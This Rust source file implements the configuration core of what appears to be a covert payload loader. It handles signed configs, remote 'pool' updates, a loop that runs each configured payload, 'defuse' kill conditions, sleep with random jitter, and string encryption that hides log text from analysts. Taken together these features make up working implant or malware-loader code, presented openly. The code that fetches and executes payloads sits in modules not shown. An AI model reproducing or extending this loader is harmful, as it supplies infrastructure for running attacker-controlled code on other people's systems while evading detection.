use crate::defuse::{Defuse, Operator};
use crate::payload::Payload;
use crate::poollink::PoolLinks;
use chksum_sha2_512 as sha2_512;
use rand::Rng;
use ring::signature::Ed25519KeyPair;
use ring::signature::{self, KeyPair};
use serde::{Deserialize, Serialize};
use std::format;
use std::fs;
use std::{thread, time};

use log::debug;
use log::info;
use log::warn;

use cryptify::encrypt_string;

use chrono::prelude::*;
use std::collections::BTreeMap;
//#use chrono::serde::ts_seconds_option;
//    #[serde(with = "ts_seconds_option")]

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct SignMaterial {
    pub peer_public_key_bytes: Vec<u8>,
    pub sign_bytes: Vec<u8>,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct Config {
    pub update_links: BTreeMap<String, PoolLinks>,
    pub payloads: Vec<Payload>,
    pub defuse_update: Vec<Defuse>,
    pub defuse_payload: Vec<Defuse>,
    pub sign_material: SignMaterial,
    pub sleep: u64,
    pub jitt: u64,
    pub date: DateTime<Utc>,
}
#[allow(dead_code)]
impl Config {
    pub fn new_unsigned(
        update_links: BTreeMap<String, PoolLinks>,
        payloads: Vec<Payload>,
        defuse_update: Vec<Defuse>,
        defuse_payload: Vec<Defuse>,
        sleep: u64,
        jitt: u64,
    ) -> Config {
        let sign_material = SignMaterial {
            peer_public_key_bytes: vec![],
            sign_bytes: vec![],
        };
        Config {
            update_links: update_links,
            sign_material: sign_material,
            payloads: payloads,
            defuse_update: defuse_update,
            defuse_payload: defuse_payload,
            sleep: sleep,
            jitt: jitt,
            date: Utc::now(),
        }
    }
    pub fn new_empty() -> Config {
        let sign_material = SignMaterial {
            peer_public_key_bytes: vec![],
            sign_bytes: vec![],
        };
        Config {
            update_links: BTreeMap::new(),
            sign_material: sign_material,
            payloads: vec![],
            defuse_update: vec![],
            defuse_payload: vec![],
            sleep: 0,
            jitt: 0,
            date: Utc::now(),
        }
    }

    pub fn new_signed(
        key_pair: &Ed25519KeyPair,
        update_links: BTreeMap<String, PoolLinks>,
        payloads: Vec<Payload>,
        defuse_update: Vec<Defuse>,
        defuse_payload: Vec<Defuse>,
        sleep: u64,
        jitt: u64,
    ) -> Config {
        let mut new_loader = Config::new_unsigned(
            update_links,
            payloads,
            defuse_update,
            defuse_payload,
            sleep,
            jitt,
        );
        let peer_public_key_bytes = key_pair.public_key().as_ref().to_vec();
        new_loader.sign_material.peer_public_key_bytes = peer_public_key_bytes;
        new_loader.sign_loader(key_pair);
        new_loader
    }

    pub fn return_sign_data(&self) -> String {
        let copy_loaderconf = &mut self.clone();
        copy_loaderconf.sign_material.sign_bytes = vec![];
        format!("sign_data: {:?}", copy_loaderconf)
    }

    pub fn sign_loader(&mut self, key_pair: &Ed25519KeyPair) {
        let peer_public_key_bytes = key_pair.public_key().as_ref().to_vec();
        let sign_data = self.return_sign_data();
        let sig: signature::Signature = key_pair.sign(sign_data.as_bytes());
        let sign_bytes = sig.as_ref();
        let sign_material = SignMaterial {
            peer_public_key_bytes: peer_public_key_bytes,
            sign_bytes: sign_bytes.to_vec(),
        };
        self.sign_material = sign_material;
    }

    pub fn verify_newloader_sign(
        &self,
        otherloader: &Config,
    ) -> Result<(), ring::error::Unspecified> {
        let sign_data = otherloader.return_sign_data();
        let peer_public_key = signature::UnparsedPublicKey::new(
            &signature::ED25519,
            &self.sign_material.peer_public_key_bytes,
        );
        peer_public_key.verify(sign_data.as_bytes(), &otherloader.sign_material.sign_bytes)
    }

    pub fn new_fromfile(path_file: &str) -> Config {
        let loader_bytes: Vec<u8> = fs::read(path_file).unwrap();
        let l = std::str::from_utf8(&loader_bytes).unwrap();
        let loader: Config = serde_json::from_str(l).unwrap();
        loader
    }

    pub fn print_loader(&self) {
        debug!("{:#?}", self);
    }
    pub fn print_loader_compact(&self) {
        debug!("print_loader_compact");
        debug!("{:?}", self);
    }
    pub fn get_loader_without_sign_material(&self) -> String {
        let mut print_loader: Config = self.clone();
        let clean_sign_material = SignMaterial {
            peer_public_key_bytes: vec![],
            sign_bytes: vec![],
        };
        print_loader.sign_material = clean_sign_material;
        format!("{:#?}", print_loader)
    }
    pub fn print_loader_without_sign_material(&self) {
        debug!("{}", self.get_loader_without_sign_material());
    }
    pub fn serialize_to_file(&self, path_file: &str) {
        let serialized: String = self.concat_loader_jsondata();
        fs::write(path_file, &serialized).expect("Unable to write file");
    }
    pub fn serialize_to_file_pretty(&self, path_file: &str) {
        let serialized: String = serde_json::to_string_pretty(&self).unwrap();
        fs::write(path_file, &serialized).expect("Unable to write file");
    }
    pub fn concat_loader_jsondata(&self) -> String {
        serde_json::to_string(&self).unwrap()
    }
    pub fn print_loader_hash(&self) {
        debug!(
            "{}{}",
            encrypt_string!("hash: "),
            self.calculate_loader_hash()
        );
    }
    pub fn calculate_loader_hash(&self) -> String {
        let serialized = self.concat_loader_jsondata();
        let data = serialized;
        let digest = sha2_512::chksum(data).unwrap();
        digest.to_hex_lowercase()
    }
    pub fn is_same_loader_hash(&self, otherloader: &Config) -> bool {
        let loader_hash = self.calculate_loader_hash();
        let otherloader_hash = otherloader.calculate_loader_hash();
        loader_hash == otherloader_hash
    }
    pub fn is_same_loader(&self, otherloader: &Config) -> bool {
        let loader_serialized = self.concat_loader_jsondata();
        let otherloader_serialized = otherloader.concat_loader_jsondata();
        loader_serialized == otherloader_serialized
    }
    pub fn fromfile_master_keypair(path_file: &str) -> Ed25519KeyPair {
        let pkcs8_bytes: Vec<u8> = fs::read(path_file).unwrap();
        signature::Ed25519KeyPair::from_pkcs8(pkcs8_bytes.as_ref()).unwrap()
    }

    pub fn exec_payloads(&self) {
        let mut nb_payload = 1;
        for payload in &self.payloads {
            info!(
                "{}/{}{}{:?}",
                nb_payload,
                &self.payloads.len(),
                encrypt_string!(" payload: "),
                &payload
            );
            payload.print_payload_compact();
            payload.exec_payload();
            nb_payload = nb_payload + 1;
        }
    }

    pub fn stop_defuse(&self, defuse_list: &Vec<Defuse>) -> bool {
        let mut nb_defuse: i32 = 1;
        let mut check_this_defuse = true;
        for defuse in defuse_list {
            info!(
                "{}/{}{}{:?}",
                nb_defuse,
                defuse_list.len(),
                encrypt_string!(" defuse: "),
                defuse
            );
            if check_this_defuse {
                if defuse.stop_the_exec() {
                    match defuse.get_operator() {
                        Operator::AND => return true,
                        Operator::OR => {}
                    }
                } else {
                    match defuse.get_operator() {
                        Operator::AND => {}
                        Operator::OR => check_this_defuse = false,
                    }
                }
            } else {
                match defuse.get_operator() {
                    Operator::AND => check_this_defuse = true,
                    Operator::OR => {}
                }
            }
            nb_defuse = nb_defuse + 1;
        }
        false
    }
    pub fn sleep_and_jitt(&self) {
        let mut rng: rand::prelude::ThreadRng = rand::thread_rng();
        let random_number: f64 = rng.gen();

        let jitt = (self.jitt as f64) * random_number;
        let total_sleep = (self.sleep as f64) + jitt;
        info!("{}{}", encrypt_string!("sleep: "), total_sleep);
        let sleep_time: time::Duration = time::Duration::from_millis((total_sleep * 1000.0) as u64);
        thread::sleep(sleep_time);
    }

    // try to fetch a new config, if no config are found return self. if no config is return from pool, need to try the next pool
    pub fn update_config(&self) -> Config {
        let mut pool_nb: i32 = 0;
        for (pool_name, pool_links) in &self.update_links {
            pool_nb = pool_nb + 1;
            info!(
                "{}/{}{}{}",
                pool_nb,
                &self.update_links.len(),
                encrypt_string!(" PoolLinks: "),
                &pool_name
            );
            match pool_links.update_pool(&self) {
                Ok(newconf) => {
                    if self.is_same_loader(&newconf) {
                        info!("{}", encrypt_string!("same active config: yes"));
                        info!(
                            "{}",
                            encrypt_string!(
                                "[+] DECISION: keep the same active CONFIG, and run the payloads"
                            )
                        );
                    } else {
                        info!(
                            "{}",
                            encrypt_string!(
                                "[+] DECISION: replace the active CONFIG, and run the payloads"
                            )
                        );
                    }

                    return newconf;
                }
                Err(error) => {
                    warn!(
                        "{}{}",
                        encrypt_string!("[+] Switch to next Pool, reason: "),
                        error
                    );
                    ()
                }
            };
        }
        info!(
            "{}",
            encrypt_string!("[+] All pool fetch without finding a new one")
        );
        info!(
            "{}",
            encrypt_string!("[+] DECISION: keep the same active CONFIG, and run the payloads")
        );
        self.to_owned()
    }
}
